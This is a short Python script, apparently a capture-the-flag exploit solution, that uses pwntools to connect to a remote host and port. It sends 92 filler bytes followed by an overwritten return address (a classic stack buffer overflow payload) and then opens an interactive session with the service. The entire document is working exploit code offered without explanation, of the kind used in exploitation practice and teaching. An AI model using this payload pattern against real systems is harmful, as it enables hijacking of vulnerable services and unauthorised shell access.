import pwn
r=pwn.remote('20.171.33.225', 4985)
print(r.recv())
print('h')
r.send('A'*92 + '\x86\x91\x04\x08')
r.interactive()
